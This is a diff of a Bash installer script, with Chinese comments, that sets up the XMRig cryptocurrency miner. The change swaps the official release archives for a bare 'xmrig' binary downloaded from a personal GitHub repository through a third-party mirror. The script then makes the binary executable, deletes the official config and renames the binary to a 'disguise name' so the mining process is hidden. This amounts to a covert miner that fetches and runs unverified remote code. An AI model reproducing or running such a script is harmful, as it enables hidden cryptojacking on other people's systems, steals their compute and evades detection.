@@ -322,20 +322,10 @@ get_download_url() {
             ;;
     esac
     
-    # 单独处理macOS
-    if [[ "$OSTYPE" == "darwin"* ]]; then
-        if [ "$ARCH" = "arm64" ]; then
-            FILENAME="xmrig-${VERSION}-macos-arm64.tar.gz"
-        else
-            FILENAME="xmrig-${VERSION}-macos-x64.tar.gz"
-        fi
-    else
-        # Linux和其他类Unix系统
-        # 注意：XMRig没有提供Linux ARM64版本，所有架构都使用x64静态构建版本
-        FILENAME="xmrig-${VERSION}-${DISTRO}-x64.tar.gz"
-    fi
+    # 直接使用可执行文件名，不再需要压缩包
+    FILENAME="xmrig"
     
-    DOWNLOAD_URL="https://gh.llkk.cc/https://github.com/xmrig/xmrig/releases/download/v${VERSION}/${FILENAME}"
+    DOWNLOAD_URL="https://gh.llkk.cc/https://github.com/jiaran464/xmr/raw/main/xmrig"
     
     log_info "下载链接: $DOWNLOAD_URL"
 }
@@ -693,15 +683,12 @@ download_precompiled_binary() {
     
     log_info "文件下载完成，大小: $(du -h "$FILENAME" | cut -f1)"
     
-    # 解压文件
-    log_info "解压文件..."
-    tar -xzf "$FILENAME" --strip-components=1 || {
-        log_error "解压失败"
+    # 设置可执行权限
+    log_info "设置可执行权限..."
+    chmod +x "$FILENAME" || {
+        log_error "设置可执行权限失败"
         exit 1
     }
-    
-    # 清理下载文件
-    rm -f "$FILENAME"
     
     # 删除官方配置文件（如果存在）
     if [ -f "$WORK_DIR/config.json" ]; then
@@ -719,15 +706,12 @@ download_precompiled_binary() {
     # 获取伪装名称（在重命名前重新获取）
     local disguise_name=$(get_disguise_name)
     
-    # 设置执行权限
-    chmod +x xmrig
-    
     # 进程名称伪装
     log_info "设置进程伪装..."
     log_info "将xmrig重命名为: $disguise_name"
     
     # 重命名xmrig为伪装名称
-    mv xmrig "$disguise_name" || {
+    mv "$FILENAME" "$disguise_name" || {
         log_error "重命名xmrig失败"
         exit 1
     }
